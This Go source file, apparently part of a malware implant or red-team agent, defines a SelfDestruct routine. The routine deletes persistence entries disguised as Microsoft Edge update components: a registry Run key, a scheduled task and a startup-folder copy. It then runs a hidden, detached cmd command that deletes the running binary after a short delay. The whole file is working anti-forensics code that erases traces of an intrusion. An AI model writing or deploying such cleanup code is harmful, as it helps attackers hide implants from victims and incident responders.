package ttp

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

// SelfDestruct removes all persistence artifacts and deletes the binary, then exits.
func SelfDestruct() {
	exe, _ := os.Executable()

	// Remove registry Run key
	exec.Command("reg", "delete",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "MicrosoftEdgeUpdateService", "/f").Run()

	// Remove scheduled task
	exec.Command("schtasks", "/Delete", "/TN", "MicrosoftEdgeUpdateCore", "/F").Run()

	// Remove startup folder copy
	appdata := os.Getenv("APPDATA")
	if appdata != "" {
		startupCopy := appdata + `\Microsoft\Windows\Start Menu\Programs\Startup\msedgeupdate.exe`
		os.Remove(startupCopy)
	}

	// Schedule self-deletion after exit:
	// ping delays 3 seconds, then del /f /q removes the binary.
	if exe != "" {
		script := fmt.Sprintf(`ping -n 3 127.0.0.1 > nul & del /f /q "%s"`, exe)
		cmd := exec.Command("cmd", "/C", script)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x00000008, // DETACHED_PROCESS
		}
		cmd.Start()
	}

	os.Exit(0)
}
